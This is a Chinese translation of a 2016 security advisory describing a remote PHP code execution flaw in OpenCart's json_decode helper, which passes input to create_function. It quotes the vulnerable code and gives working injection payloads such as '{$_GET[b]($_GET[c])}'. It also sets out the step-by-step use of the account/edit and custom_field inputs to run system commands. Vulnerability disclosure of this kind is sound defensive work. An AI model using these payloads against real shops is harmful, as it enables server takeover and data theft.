> 原文链接: https://www.anquanke.com//post/id/83757 


# OpenCart json_decode函数中存在远程PHP代码执行漏洞


                                阅读量   
                                **174101**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：360安全播报
                                <br>原文地址：[http://seclists.org/bugtraq/2016/Apr/61](http://seclists.org/bugtraq/2016/Apr/61)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p0.ssl.qhimg.com/t01e911cd52325432e5.jpg)](https://p0.ssl.qhimg.com/t01e911cd52325432e5.jpg)

最近,安全研究人员Naser Farhadi(Twitter: @naserfarhadi)发现OpenCart json_decode函数中存在远程PHP代码执行漏洞,涉及到的版本有2.1.0.2 到 2.2.0.0 (最新版本)

漏洞存在于 /upload/system/helper/json.php中,其中有这段代码



```
# /upload/system/helper/json.php
$match = '/".*?(?&lt;!\\)"/';
$string = preg_replace($match, '', $json);
$string = preg_replace('/[,:`{``}`[]0-9.-+Eaeflnr-u nrt]/', '', $string);
...
$function = @create_function('', "return `{`$json`}`;"); /**** 万恶之源 ****/
$return = ($function) ? $function() : null;
...
return $return;
```

其中通过json进行了函数的创建,而json_decode函数可被利用

这里是几个简单的测试例子

var_dump(json_decode('`{`"ok":"1"."2"."3"`}`'));

 

[![](https://p1.ssl.qhimg.com/t01af7d32805ebbcb2b.png)](https://p1.ssl.qhimg.com/t01af7d32805ebbcb2b.png)

var_dump(json_decode('`{`"ok":"$_SERVER[HTTP_USER_AGENT]"`}`'));

[![](https://p2.ssl.qhimg.com/t01efd34243fc59bbcc.png)](https://p2.ssl.qhimg.com/t01efd34243fc59bbcc.png)

 var_dump(json_decode('`{`"ok":"`{`$_GET[b]($_GET[c])`}`"`}`'));

 

[![](https://p4.ssl.qhimg.com/t019da65c44caeb5ef8.png)](https://p4.ssl.qhimg.com/t019da65c44caeb5ef8.png)

[![](https://p5.ssl.qhimg.com/t01bbed4b7a65d98cbc.png)](https://p5.ssl.qhimg.com/t01bbed4b7a65d98cbc.png)

[![](https://p0.ssl.qhimg.com/t0193c0c17c75b284f0.png)](https://p0.ssl.qhimg.com/t0193c0c17c75b284f0.png)

 在真实场景中,可以通过/index.php?route=account/edit进行利用

例如将$_SERVER[HTTP_USER_AGENT]作为姓名填写进去,保存(需要重复两次)

[![](https://p4.ssl.qhimg.com/t017744ee18bb5403df.png)](https://p4.ssl.qhimg.com/t017744ee18bb5403df.png)

之后当管理员访问管理面板时,他会在最近活动中本应显示你的姓名的地方看到他自己的UserAgent

[![](https://p5.ssl.qhimg.com/t01882ed02c1581cb27.png)](https://p5.ssl.qhimg.com/t01882ed02c1581cb27.png)

另一个例子是在account/edit 或者 account/register 中的 custom_field ,在这里进行利用可能是最合适的

如果管理员在/admin/index.php?route=customer/custom_field中添加了一个自定义的区域用于电话号码之类的额外信息

[![](https://p2.ssl.qhimg.com/t01e8a91c5c48a7f625.png)](https://p2.ssl.qhimg.com/t01e8a91c5c48a7f625.png)

你就可以直接注入你的代码在这个custom_field中

例如将`{`$_GET[b]($_GET[c])`}`填写到这个custom_field中,保存

[![](https://p4.ssl.qhimg.com/t01ca2957b096f1eb77.png)](https://p4.ssl.qhimg.com/t01ca2957b096f1eb77.png)

然后访问

[http://host/shop_directory/index.php?route=account/edit&amp;b=system&amp;c=ls](http://host/shop_directory/index.php?route=account/edit&amp;b=system&amp;c=ls)

你会看到代码被正确执行了

 

[![](https://p1.ssl.qhimg.com/t011137a1d5d613bbe4.png)](https://p1.ssl.qhimg.com/t011137a1d5d613bbe4.png)

 

[![](https://p0.ssl.qhimg.com/t01d435afb7fe4e6673.png)](https://p0.ssl.qhimg.com/t01d435afb7fe4e6673.png)

需要注意的是,这种利用方式只会在 PHP JSON扩展没有安装的情况下有效
